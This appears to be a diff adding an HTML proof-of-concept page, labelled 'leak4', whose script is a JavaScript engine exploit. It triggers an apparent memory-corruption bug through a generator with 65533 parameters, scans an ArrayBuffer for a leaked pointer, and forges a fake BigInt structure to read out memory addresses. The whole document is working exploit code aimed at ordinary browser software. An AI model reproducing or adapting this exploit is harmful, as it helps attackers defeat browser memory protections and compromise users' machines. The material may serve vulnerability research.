@@ -1,0 +1,34 @@
+<!doctype html>
+<meta charset="utf-8">
+<div id="w">1865 leak4: start</div>
+<script>
+requestAnimationFrame(function(){ var e=document.getElementById('w'); if(e) e.textContent = String(globalThis.RESULT || 'NONE'); });
+</script>
+<script>
+(function(){
+  try {
+    var params="x,".repeat(65533)+"y";
+    eval("function* g("+params+"){ if(0) eval(''); var f=()=>y, a=0, b=0, c=0, d=0; yield f; }");
+    var b0=new ArrayBuffer(1048576); var v0=new Uint8Array(b0); v0.fill(0);
+    var it=g(); var f=it.next().value;
+    var V=0n, off=-1;
+    for (var i=0;i<v0.length;i+=8){ var lo=(v0[i]|(v0[i+1]<<8)|(v0[i+2]<<16)|(v0[i+3]<<24))>>>0; var hi=(v0[i+4]|(v0[i+5]<<8)|(v0[i+6]<<16)|(v0[i+7]<<24))>>>0; if(lo||hi){ V=BigInt(hi)*4294967296n+BigInt(lo); off=i; break; } }
+    if (V===0n) { globalThis.RESULT='L4 NOLEAK'; return; }
+    it.next();
+    var buf2=new ArrayBuffer(1048776); var dv=new DataView(buf2);
+    /* P=V+0x14: len at the flags/pad word = 0x77, tab=V+0x18=pvalue;
+       refcount at V+0x10 = 0x01000000 (positive, so no spurious free) */
+    dv.setBigUint64(65533*16, V+0x14n, true);
+    dv.setBigUint64(65533*16+8, 0xfffffffffffffff7n, true);
+    var big=f();
+    var hs=big.toString(16);
+    var neg=(hs.charAt(0)==='-'); if(neg) hs=hs.slice(1);
+    var mag=BigInt('0x'+(hs.length?hs:'0'));
+    var len=Number((V>>32n)&0xffn);
+    var raw=neg ? ((1n<<BigInt(32*len))-mag) : mag;
+    var pv=raw & 0xFFFFFFFFFFFFFFFFn;
+    var sf=(raw >> 128n) & 0xFFFFFFFFFFFFFFFFn;
+    globalThis.RESULT='L4 off='+off+' V=0x'+V.toString(16)+' len=0x'+len.toString(16)+' neg='+(neg?1:0)+' hl='+hs.length+' pv=0x'+pv.toString(16)+' sf=0x'+sf.toString(16);
+  } catch(e){ globalThis.RESULT='L4 ERR '+(e&&e.message?e.message:String(e)); }
+})();
+</script>
